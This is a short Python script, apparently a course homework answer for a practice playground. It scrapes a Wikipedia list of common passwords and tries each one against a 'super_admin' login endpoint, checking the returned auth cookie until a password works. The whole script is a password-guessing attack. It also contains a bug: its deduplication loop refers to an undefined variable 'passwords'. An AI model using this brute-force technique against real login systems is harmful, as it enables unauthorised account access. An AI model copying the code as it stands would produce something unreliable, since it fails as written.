import requests
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response.text)
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
wiki_list = tree.xpath(locator)

temp = []
for password in  passwords:
    password = password[:-1]
    if password not in temp:
        temp.append(password)

wiki_list = temp

for i in wiki_list:
    payload1 = {"login":"super_admin", "password":f"{i}"}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                          data = payload1)
    auth_cookie = response1.cookies.get('auth_cookie')
    cookies = {}
    if auth_cookie is not None:
        cookies.update({'auth_cookie': auth_cookie})
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                              cookies = cookies)
    if response2.text == "You are authorized":
        print(f"Пароль: \"{i}\"")
        break

